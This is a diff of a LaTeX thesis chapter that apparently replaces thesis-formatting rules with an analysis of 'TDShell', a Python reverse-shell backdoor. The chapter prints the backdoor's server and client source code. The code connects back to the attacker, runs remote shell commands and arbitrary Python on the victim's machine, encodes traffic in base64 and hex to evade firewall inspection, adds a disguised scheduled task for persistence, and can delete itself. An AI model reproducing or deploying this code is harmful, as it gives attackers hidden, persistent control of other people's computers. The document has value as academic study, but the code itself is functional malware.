@@ -1,35 +1,270 @@
-\chapter{TDShell的工作原理与分析}
-毕业论文(设计)一般由以下部分组成：\cite{1}
-\subitem 毕业论文(设计)封面;
-\subitem 诚信承诺书;
-\subitem 中英文摘要;
-\subitem 目录;
-\subitem 正文;
-\subitem 参考文献;
-\subitem 附录;
-\subitem 致谢;
-\subitem 成绩评定表;
-\subitem 答辩记录;
-\subitem 论文相似性鉴定报告 首页。
+\chapter{后门的工作原理与分析}
+shell后门使用python语言编写完成，对python环境产生依赖，在Linux环境下基本默认安装了python环境，在Windows环境中则需要另外配置环境，因而该后门脚本具有一定的跨平台性。该脚本主要用于在宿主主机中在受害者用户没有发觉的情况下建立安全的TCP连接，从受害主机端启动客户端程序向攻击者主机反弹Shell并远程执行命令。
 
-\section{连接参数配置函数的工作原理和实现}
+socket起源于Unix，而Unix/Linux基本哲学之一就是“一切皆文件”，对于文件用“打开”、“读写”、“关闭”模式来操作。socket就是该模式的一个实现，socket即是一种特殊的文件，一些socket函数就是对其进行的操作，如：读/写IO、打开、关闭。基本上，Socket 是任何一种计算机网络通讯中最基础的内容\cite{8} 。
 
-由学生本人亲自用黑色水笔手写签订《淮北师范大学本科生毕业论文(设计)诚信承诺 书》。诚信承诺书内容见校教字[2013]67 号文的附件 5。
+该脚本由服务端，客户端组成，在不同的class中由不同的函数完成相应的功能并实现最终的数据的传递与交换，最终完成命令执行等任务。代码结构如下：
 
-\section{数据处理函数的工作原理和实现}
 
-摘要是论文内容的简要陈述，应尽量反映论文的主要信息，内容包括研究目的、方法、 成果、结论及主要创新之处等，不含图表，不加注释，具有独立性和完整性。中文摘要不少 于 200 字，英文摘要应与中文摘相对应，且中文摘要在前，英文摘要在后。中文摘要和英文 摘要均要另起一页。
 
-关键词是反映毕业设计(论文)主题内容的名词，是供检索使用的。中英文摘要均要有 关键词，关键词一般为 3-5 个，各关键词用分号隔开。关键词排在摘要正文部分下方。
+\begin{breakablealgorithm}
+        \caption{代码结构}  
+        \begin{algorithmic}[1] %每行显示行号  
+         \Require $Server$服务端，$Client$客户端，$Main$主函数\\
+			$--class Server$\\  
+				$----connec()$\\
+				$----handle\_client()$\\
+				$----main()$\\
+			$--class Client$\\
+				$----request\_client()$\\
+				$----response\_client()$\\
+				$----kill()$\\
+				$----exit()$\\
+				$----main()$\\
+			$--Main $          
+        \end{algorithmic}  
+\end{breakablealgorithm}  
 
-中文摘要页中，论文主标题样式用二号、黑体、居中，单倍行距，段前 12 磅，段后 6 磅;若有子标题，子标题样式用四号、宋体、加粗，右对齐，右侧缩进 4 字符，单倍行距， 段前 0 磅，段后 24 磅。论文标题排在摘要之前。
 
-中文摘要标题“摘要”和“关键词”几个字样式用小四、黑体、加粗、顶格，中文摘要 正文样式用小四、宋体、行距固定值 20 磅(注:行间距 12 磅为 1 行，下同)。摘要标题后 紧接写摘要正文(不另起一行)。中文关键词样式用小四、宋体、行距固定值 20 磅。
+\section{主函数的工作原理及实现}
+脚本中对输入参数sys.argv进行嵌套判断，参数个数长度大于3则将参数的第一个传递给type\_s用以判断执行何种class，第二个参数传递给ip，第三个参数传递给port。最终将ip与port整合成address\_all。第一个参数有两个选项，当输入的参数为-l时调用Servers()，当参数为-s时调用Client()。经过上述嵌套判断确认是不非法的输入时，将会对使用者进行使用方式的提示。
 
-英文摘要页中，论文主标题样式用二号、Arial、加粗、居中，单倍行距，段前 12 磅， 段后 6 磅;若有子标题，子标题样式用四号、Arial、加粗，右对齐，右侧缩进 4 字符，单 倍行距，段前 0 磅，段后 24 磅。主标题和子标题的第一个词和所有实词首字母大写，虚词 首字母小写。
+\begin{breakablealgorithm}
+	\caption{主函数}
+	\begin{algorithmic}[1]
+	\Require $mains$\\
+	
+def mains():\\
+		
+	'''\\
+	
+	从控制台接收参数，执行相应的代码（Client or Server）\\
+	
+	'''\\
+	
+	\qquad if \quad len($sys.argv$)>3:\\
+	
+		\qquad \qquad $type\_s$=str($sys.argv[1]$)\\
+		
+		\qquad \qquad $ip$=str($sys.argv[2]$)\\
+		
+		\qquad \qquad $port$=int($sys.argv[3]$)\\
+		
+		\qquad \qquad $address\_all$=($ip,port$)\\
+		
+		\qquad \qquad if \quad $type\_s$=='$-l$':\qquad \#-listen\\
+		
+			\qquad \qquad\qquad servers($address\_all$)\\
+		
+		\qquad \qquad elif \quad $type\_s$=='-s':\qquad \#-slave\\
+		
+			\qquad \qquad\quad\quad clients($address\_all$)\\
+		
+		\qquad \qquad else:\\
+		
+			\qquad \qquad \qquad print \quad '[HELP]  TDShell.exe [-l（listen）/-s (slave)] [$ip$] [$port$]'\\
+			
+			\qquad \qquad \qquad print \quad '[HELP]  python TDShell.TD [-l（listen）/-s (slave)] [$ip$] [$port$]'\\
+			
+			\qquad \qquad \qquad print \quad u'connection：'\\
+			
+			\qquad \qquad \qquad print \quad u'[HELP]  \quad exit   \quad  ----退出连接'\\
+		
+			\qquad \qquad \qquad print \quad u'[HELP]  \quad kill  \quad   ----退出连接并自毁程序'\\
+			
+			\qquad \qquad \qquad print \quad u'[HELP]  \quad python \quad -p \quad file.py   \quad  ----在肉鸡上执行本地python脚本'\\
+			
+	\qquad else:\\
+	
+			\qquad \qquad \qquad print \quad '[HELP]  TDShell.exe [-l（listen）/-s (slave)] [$ip$] [$port$]'\\
+			
+			\qquad \qquad \qquad print \quad '[HELP]  python TDShell.TD [-l（listen）/-s (slave)] [$ip$] [$port$]'\\
+			
+			\qquad \qquad \qquad print \quad u'connection：'\\
+			
+			\qquad \qquad \qquad print \quad u'[HELP]  \quad exit   \quad  ----退出连接'\\
+		
+			\qquad \qquad \qquad print \quad u'[HELP]  \quad kill  \quad   ----退出连接并自毁程序'\\
+			
+			\qquad \qquad \qquad print \quad u'[HELP]  \quad python \quad -p \quad file.py   \quad  ----在肉鸡上执行本地python脚本'\\
+if\quad $\_\_name\_\_=='\_\_main\_\_'$:\\
+	\qquad print u'----------------------------------------'\\
+	\qquad mains()
+	\end{algorithmic}
+\end{breakablealgorithm}
 
-英文摘要标题“Abstract”和“Key words”几个字样式用小四、Times New Roman、加 粗、顶格，英文摘要正文样式用小四、Times New Roman，两端对齐，行距固定值 20 磅。每 个英文关键词首字母要大写，样式用小四、Times New Roman，行距固定值 20 磅。
 
-\section{主函数的工作原理与实现}
-目录按三级标题编写，要求层次清晰，且要与正文标题一致。主要包括绪论(或引言)、 正文主体、结论(或总结)、参考文献、附录及致谢等。“目录”二字样式用小三号、黑体、 加粗、居中，单倍行距，段前 0 磅，段后 12 磅，“目”与“录”之间空四格。目录内容中文 样式用宋体，英文样式用 Times New Roman。字号、行间距自行统一样式。目录要另起一页。
+\section{服务端功能的实现}
+服务端代码中利用了python进行socket编程，通过执行TCPServer.\_\_init\_\_ 方法初始化，创建服务端Socket对象并绑定IP地址和端口，执行 BaseServer.\_\_init\_\_ 方法，将自定义的继承自SocketServer.BaseRequestHandler 的类 MyRequestHandle赋值给 self.RequestHandlerClass执行 BaseServer.server\_forever 方法，While 循环一直监听是否有客户端请求到达\cite{6} 。当客户端连接到达服务器，执行 ThreadingMixIn.process\_request 方法，创建一个 “线程” 用来处理请求。
+执行 ThreadingMixIn.process\_request\_thread 方法。
+执行 BaseServer.finish\_request 方法，执行 self.RequestHandlerClass()  即：执行 自定义 MyRequestHandler 的构造方法。
+
+
+
+\begin{breakablealgorithm}
+	\caption{服务端代码}
+	\begin{algorithmic}[1]
+	\Require $socket$\\
+class servers:\\
+
+\qquad def $\_\_init\_\_(self,server\_address)$:\\
+		\qquad \qquad $self.server\_address$=$server\_address$\\
+		\qquad \qquad $self.main()$\\
+\\
+\qquad def\quad  $connec(self)$:\qquad\#链接参数配置函数\\
+		\qquad \qquad try:\\
+			\qquad \qquad \qquad $self.server$=$socket.socket$($socket.AF\_INET$,$socket.SOCK\_STREAM$) \\
+			\qquad \qquad \qquad $self.server.bind$($self.server\_address$) \qquad \#ip:port\\
+			\qquad \qquad \qquad $self.server.listen(10)$\qquad\#设置最大连接数\\
+			\qquad \qquad \qquad print  "[*]Listening on \%s:\%d" \% ($self.server\_address[0]$,\\
+			\qquad \qquad \qquad$self.server\_addr--ess[1]$)\\
+		\qquad \qquad except:\\
+			\qquad \qquad \qquad print u'参数填写有误,或者该端口已被占用'\\
+\\
+\qquad def \quad $handle\_client(self)$:\qquad \#数据处理函数\\
+			\qquad \qquad $request$=$self.client.recv(409600)$  \qquad\#服务器端每次接收的最大数据\\
+		\qquad \qquad $request$=$base64.b64decode(binascii.a2b\_hex(request.strip())).split('*')$ \\
+			\qquad \qquad print $request[0]$  \qquad \#输出接收到的数据\\
+			
+			\qquad \qquad $path$=$request[1]$\\
+			\qquad \qquad $contents$=$raw\_input(path+'>') $\qquad \#返回当前路径\\
+			\qquad \qquad $i$='-p'\\
+			\qquad \qquad if $i$ in $contents$:\\
+				\qquad \qquad \qquad $lists$=$contents.split$(' ')\\
+				\qquad \qquad \qquad $filename$=$lists[2]$\\
+				\qquad \qquad \qquad $f$=$open(filename).read()$\\
+				\qquad \qquad \qquad $contents$=$'-p'+f$\\
+
+			\qquad \qquad $contents\_j$=$binascii.b2a\_hex(base64.b64encode(contents)) $\\			\qquad \qquad self.client.send($contents\_j$+' ') \qquad \#发送数据\\
+			\qquad \qquad self.client.close()\\
+
+			\qquad \qquad if\quad  $contents$=='kill'\quad  or\quad  $contents$=='exit':\\
+				\qquad \qquad \qquad $time.sleep(5)$\\
+				\qquad \qquad \qquad $sys.exit()$\\
+\\
+\qquad def\quad  $main(self)$:\qquad \#主函数\\
+		\qquad \quad  $self.connec()$ \qquad \#执行连接函数\\
+		\qquad \quad  while True:\\
+
+			\qquad \qquad  try:\\
+			\qquad \qquad \qquad $self.client,self.addr$=$self.server.accept()$\\
+			\qquad \qquad \qquad $self.handle\_client()$   \qquad \#执行接收发送数据函数\\
+			\qquad \qquad except:\\
+				\qquad \qquad \qquad $sys.exit()$
+	\end{algorithmic}
+\end{breakablealgorithm}
+\subsection{连接参数配置函数的工作原理和实现}
+从键盘输入的三个参数传入connec()函数，函数会尝试从socket.AF\_INET和socket.-\\-SOCK\_STREAM中获取self.server参数信息，紧接着完成套接字和最大连接的初始化。在完成上述过程后会继续打印相应的提示，否则则会提醒输入的参数有误。代码中s.bind(address) 将套接字绑定到地址\cite{9}。address地址的格式取决于地址族。在AF\_INET下，以元组（host,port）的形式表示地址。socket.listen(backlog)开始监听传入连接。backlog指定在拒绝连接之前，可以挂起的最大连接数量。backlog等于5，表示内核已经接到了连接请求，但服务器还没有调用accept进行处理的连接个数最大为5，这个值不能无限大，因为要在内核中维护连接队列。
+
+\subsection{数据处理函数的工作原理和实现}
+这个步骤通过定义一个handle\_client()函数来实现对客户端数据的处理。同样使用socket编程，通过request接收来自self.client.recv()设置服务器端一次所接收的最大数据。因为该脚本为了躲避主流包过滤防火墙对包内容敏感信息的检测，我们通过base64编码来实现敏感数据的绕过，服务器端在这里负责对传来的数据进行解码\cite{11} 。函数所接收到的数据第一时间打印出来，之后对数组中的第二个数据传入path变量，对contents内容进行判断完成读写操作，并通过self.client.send()实现对命令的传送，当contents中含有kill或者exit时，通过sys.exit()关闭当前连接，socket.accept()接受连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据，其中address是连接客户端的地址，也可以用来接收TCP 客户的连接（阻塞式）等待连接的到来。socket.connect(address)是连接到address处的套接字。一般address的格式为元组（hostname,port）,如果连接出错，返回socket.error错误。socket.close()则是关闭套接字。
+\subsection{主函数的工作原理与实现}
+class server中定义的main函数主要是通过self.connec()执行连接，再通过一个while 对self.server.accept()和self.handle\_client()死循环实现对数据不间断的接收和发送。函数最后再不满足条件的情况下执行sys.exit()退出循环。
+
+\section{客户端原理与实现}
+\begin{breakablealgorithm}
+	\caption{客户端代码}
+	\begin{algorithmic}[1]
+	\Require $socket$\\
+class clients:\\
+\quad def \quad $\_\_init\_\_(self,client\_address)$:\\
+		\qquad $self.client\_address$=$client\_address$\\
+		\qquad self.main()\\
+\\
+\quad def \quad request\_client(self):\\
+\qquad try:\\
+\qquad \quad $path$=$os.getcwd()$\\
+\qquad \quad $self.client$=$socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)$\qquad \#创建一个socket对象\\
+\qquad \quad $self.client.connect(self.client\_address)$ \qquad \#连接服务端\\
+\qquad \quad $self.contents$=binascii.b2a\_hex(base64.b64encode(self.contents+'*'+path))\\
+\qquad \quad self.client.send(self.contents) \qquad \#发送数据\\
+\qquad except:\\
+\qquad \quad sys.exit()\\
+\\
+\quad def \quad kill(self):\\
+\qquad '''\\
+\qquad kill project\\
+\qquad '''\\
+\qquad \quad os.popen('kill.bat').read()\\
+\\
+\quad def \quad exits(self):\\
+\qquad '''\\
+\qquad exit project\\
+\qquad '''\\
+\qquad os.\_exit(0)\\
+\\
+\quad def\quad response\_client(self):\\
+\\
+\qquad try:\\
+\qquad \quad  $response$=self.client.recv(409600)\\
+\qquad except:\\
+\qquad \quad sys.exit()\\
+\qquad else:\\
+\qquad \quad $response$=base64.b64decode(binascii.a2b\_hex(response.strip()))\\
+\qquad \quad try:\\
+\qquad \qquad if\quad $response$=='exit':  \qquad \#退出当前连接\\
+\qquad \qquad \quad sys.exit()\\
+\qquad \qquad if\quad $response$=='kill':  \qquad \#退出当前连接并自毁程序\\
+\qquad \qquad \quad try:\\
+\qquad \qquad \qquad $f$=open('kill.bat','w')\\
+\qquad \qquad \qquad f.write('ping -n 2 127.0.0.1 >nul $\backslash$ndel /F TDShell.exe $\backslash$ndel /F kill.bat')\\
+\qquad \qquad \qquad f.close()\\
+\qquad \qquad \qquad threading.Thread(target=self.kill).start()\\
+\qquad \qquad \qquad time.sleep(0.5)\\
+\qquad \qquad \qquad threading.Thread(target=self.exits).start()\\
+\qquad \qquad \quad except:\\
+\qquad \qquad \qquad pass\\
+\qquad \qquad if\quad $response$=='playtasocket':        \qquad \#给自己创建计划任务。\\
+\qquad \qquad \quad try:\\
+\qquad \qquad \qquad $path$=os.getcwd()\\
+\qquad \qquad \qquad $name$=os.popen('whoami').read().split('$\backslash$ $\backslash$')[1].replace('$\backslash$n','')  \qquad \#获取当前用户名称\\
+\qquad \qquad \qquad $command$='schtasockets.exe  /Create /RU '+'"'+name+'"'+' /SC MINUTE /MO 30 /TN FIREWALL /TR '+'"'+path+'$\backslash$TDShell.exe'+'"'+' /ED 2018/12/12' \qquad \#可执行文件一定要写绝对路径\\
+\qquad \qquad \qquad $self.contents$=os.popen(command).read()\\
+\qquad \qquad \quad except:\\
+\qquad \qquad \qquad pass\\
+\qquad \qquad else:\\
+\qquad \qquad \quad i='-p'\\
+\qquad \qquad \quad if \quad $i$\quad  in response:\\
+\qquad \qquad \qquad $lists$=response.split('-p')\\
+\qquad \qquad \qquad $response$=$lists[1]$\\
+\qquad \qquad \qquad $sys.stdout$=result=StringIO()\\
+\qquad \qquad \qquad exec(response)                      \qquad \#执行TDthon脚本文件\\
+\qquad \qquad \qquad $self.contents$=result.getvalue()\\
+\qquad \qquad \quad else:\\
+\qquad \qquad \qquad $self.contents$=response.split('cd ')\\
+\qquad \qquad \qquad $m$=re.search(self.res,response)\\
+\qquad \qquad \qquad if\quad  $m$:\\
+\qquad \qquad \qquad \quad $m$=m.group()\\
+\qquad \qquad \qquad else:\\
+\qquad \qquad \qquad \quad $m$='.'\\
+\qquad \qquad \qquad if \quad len($self.contents$)>1:\\
+\qquad \qquad \qquad \quad os.chdir(self.contents[1].strip())\\
+\qquad \qquad \qquad \quad $self.contents$=' '\\
+\qquad \qquad \qquad else:\\
+\qquad \qquad \qquad \quad $self.contents$=os.popen(self.contents[0]).read()\#执行普通的cmd命令\\
+\qquad \qquad \qquad \quad os.chdir(m)\\
+\qquad \qquad except:\\
+\qquad \qquad \quad $self.contents$=' '\\
+\qquad \qquad \quad pass\\
+\qquad \qquad self.client.close()\\
+\\
+
+\quad def\quad  main(self):\\
+\qquad $self.contents$=' '\\
+\qquad $self.res$=r'[A-Za-z]:'\\
+\quad while True:\\
+\qquad $self.request\_client()$\\
+\qquad $self.response\_client()$		
+	\end{algorithmic}
+\end{breakablealgorithm}
+\subsection{连接服务器函数的工作原理与实现}
+在客户端中，定义了request\_client()函数，在当前执行环境下会通过os.getcwd()获取当前脚本的绝对路径，通过socket创建一个socket对象，再利用self.client.connect()连接客户端，使用self.client.send()发送当前的数据。上述行为意外的情况下会触发sys.exit()退出。由此完成了客户端与服务端连接函数的功能实现。
+\subsection{退出及自毁函数的工作原理与实现}
+在客户端中同样存在着kill自毁函数和exit退出函数，他们分别会触发os.popen(kill.\\bat).resd()和os.\_exit(0)来实现他们的功能。
+\subsection{处理服务器命令函数工作原理与实现}
+在客户端中，最主要的部分也是最重要的部分就是定义的response\_client()。在该函数中先response到一个返回包，必要条件下会对数据包进行base64解码\cite{10} 。
+在对服务器端发来的数据包的处理过程中，先检测exit和kill，并对其启用相应的函数对接实现相应的功能。该函数中同样使用os.getcwd()获得绝对路径，使用command传递绝对路径和攻击者远程命令，最后实现客户端本地的终端命令行的执行。
+
+
+
 
